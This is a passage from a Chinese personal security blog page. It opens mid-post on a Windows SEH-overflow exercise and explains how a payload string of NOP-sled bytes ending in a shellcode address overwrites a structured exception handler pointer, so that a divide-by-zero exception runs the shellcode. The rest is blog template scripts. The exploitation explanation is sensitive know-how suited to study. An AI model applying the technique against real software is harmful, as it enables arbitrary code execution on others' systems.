class="string">&quot;\x90\x90\x90\x90\x94\xFE\x12&quot;</span>;</span><br></pre></td></tr></table></figure>
<p>前面的字节都填充成0x90即nop指令,一是为了充当pad,二是为了增加命中率,只要是控制调到这些nop指令中,就会顺序执行到shellcode</p>
<p>最后三个字节是0x12FE94,而shellcode的基地址就是0x12FE94,也就是说将shellcode的基地址溢出到了seh节点中的异常处理函数指针上了,</p>
<p>就算是写0x12FE95,0x12FE96等等也都可以,nop已经把靶阔的很大了</p>
<p>然后除以0异常,而刚才被溢出的seh节点又恰好在seh链上首当其冲</p>
<p>因此shellcode就被当作异常处理函数调用了</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220924210055100.png"
alt="image-20220924210055100" />
<figcaption aria-hidden="true">image-20220924210055100</figcaption>
</figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/impossible/page/2/"><i class="fa fa-angle-left" aria-label="Previous page"></i></a><a class="page-number" href="/impossible/">1</a><a class="page-number" href="/impossible/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/impossible/page/4/">4</a><span class="space">&hellip;</span><a class="page-number" href="/impossible/page/9/">9</a><a class="extend next" rel="next" href="/impossible/page/4/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
  </nav>



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="dustball"
      src="https://raw.githubusercontent.com/DeutschBall/picbed/main/dustball.png">
  <p class="site-author-name" itemprop="name">dustball</p>
  <div class="site-description" itemprop="description">dustland</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-tags">
        <span class="site-state-item-count">37</span>
        <span class="site-state-item-name">tags</span>
      </div>
  </nav>
</div>
  <div class="cc-license motion-element" itemprop="license">
    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
  </div>



      </div>
        <div class="back-to-top motion-element">
          <i class="fa fa-arrow-up"></i>
          <span>0%</span>
        </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2025</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">dustball</span>
</div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a>
  </div>

        
<div class="busuanzi-count">
  <script data-pjax async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-user"></i>
      </span>
      <span class="site-uv" title="Total Visitors">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-eye"></i>
      </span>
      <span class="site-pv" title="Total Views">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/pjax/pjax.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>

  <script>
var pjax = new Pjax({
  selectors: [
    'head title',
    '#page-configurations',
    '.content-wrap',
    '.post-toc-wrap',
    '.languages',
    '#pjax'
  ],
  switches: {
    '.post-toc-wrap': Pjax.switches.innerHTML
  },
  analytics: false,
  cacheBust: false,
  scrollTo : !CONFIG.bookmark.enable
});

window.addEventListener('pjax:success', () => {
  document.querySelectorAll('script[data-pjax], script#page-configurations, #pjax script').forEach(element => {
    var code = element.text || element.textContent || element.innerHTML || '';
    var parent = element.parentNode;
    parent.removeChild(element);
    var script = document.createElement('script');
    if (element.id) {
      script.id = element.id;
    }
    if (element.className) {
      script.className = element.className;
    }
    if (element.type) {
      script.type = element.type;
    }
    if (element.src) {
      script.src = element.src;
      // Force synchronous loading of peripheral JS.
      script.async = false;
    }
    if (element.dataset.pjax !== undefined) {
      script.dataset.pjax = '';
    }
    if (code !== '') {
      script.appendChild(document.createTextNode(code));
    }
    parent.appendChild(script);
  });
  NexT.boot.refresh();
  // Define Motion Sequence & Bootstrap Motion.
  if (CONFIG.motion.enable) {
    NexT.motion.integrator
      .init()
      .add(NexT.motion.middleWares.subMenu)
      .add(NexT.motion.middleWares.postList)
      .bootstrap();
  }
  NexT.utils.updateSidebarPosition();
});
</script>




  
  <script data-pjax>
    (function(){
      var canonicalURL, curProtocol;
      //Get the <link> tag
      var x=document.getElementsByTagName("link");
		//Find the last canonical URL
		if(x.length > 0){
			for (i=0;i<x.length;i++){
				if(x[i].rel.toLowerCase() == 'canonical' && x[i].href){
					canonicalURL=x[i].href;
				}
			}
		}
    //Get protocol
	    if (!canonicalURL){
	    	curProtocol = window.location.protocol.split(':')[0];
	    }
	    else{
	    	curProtocol = canonicalURL.split(':')[0];
	    }
      //Get current URL if the canonical URL does not exist
	    if (!canonicalURL) canonicalURL = window.location.href;
	    //Assign script content. Replace current URL with the canonical URL
      !function(){var e=/([http|https]:\/\/[a-zA-Z0-9\_\.]+\.baidu\.com)/gi,r=canonicalURL,t=document.referrer;if(!e.test(r)){var n=(String(curProtocol).toLowerCase() === 'https')?"https://sp0.baidu.com/9_Q4simg2RQJ8t7jm9iCKT-xh_/s.gif":"//api.share.baidu.com/s.gif";t?(n+="?r="+encodeURIComponent(document.referrer),r&&(n+="&l="+r)):r&&(n+="?l="+r);var i=new Image;i.src=n}}(window);})();
  </script>




  
<script src="//cdn.jsdelivr.net/npm/algoliasearch@4/dist/algoliasearch-lite.umd.js"></script>
<script src="//cdn.jsdelivr.net/npm/instantsearch.js@4/dist/instantsearch.production.min.js"></script>
<script src="/js/algolia-search.js"></script>












<script data-pjax>
if (document.querySelectorAll('pre.mermaid').length) {
  NexT.utils.getScript('//cdn.jsdelivr.net/npm/mermaid@8/dist/mermaid.min.js', () => {
    mermaid.initialize({
      theme    : 'dark',
      logLevel : 3,
      flowchart: { curve     : 'linear' },
      gantt    : { axisFormat: '%m/%d/%Y' },
      sequence : { actorMargin: 50 }
    });
  }, window.mermaid);
}
</script>


    <div id="pjax">
  

  
      

<script>
  if (typeof MathJax === 'undefined') {
    window.MathJax = {
      loader: {
          load: ['[tex]/mhchem'],
        source: {
          '[tex]/amsCd': '[tex]/amscd',
          '[tex]/AMScd': '[tex]/amscd'
        }
      },
      tex: {
        inlineMath: {'[+]': [['$', '$']]},
          packages: {'[+]': ['mhchem']},
        tags: 'ams'
      },
      options: {
        renderActions: {
          findScript: [10, doc => {
            document.querySelectorAll('script[type^="math/tex"]').forEach(node => {
              const display = !!node.type.match(/; *mode=display/);
              const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
              const text = document.createTextNode('');
              node.parentNode.replaceChild(text, node);
              math.start = {node: text, delim: '', n: 0};
              math.end = {node: text, delim: '', n: 0};
              doc.math.push(math);
            });
          }, '', false],
          insertedScript: [200, () => {
            document.querySelectorAll('mjx-container').forEach(node => {
              let target = node.parentNode;
              if (target.nodeName.toLowerCase() === 'li') {
                target.parentNode.classList.add('has-jax');
              }
            });
          }, '', false]
        }
      }
    };
    (function () {
      var script = document.createElement('script');
      script.src = '//cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js';
      script.defer = true;
      document.head.appendChild(script);
    })();
  } else {
    MathJax.startup.document.state(0);
    MathJax.texReset();
    MathJax.typeset();
  }
</script>

    

  

    </div>
</body>
</html>
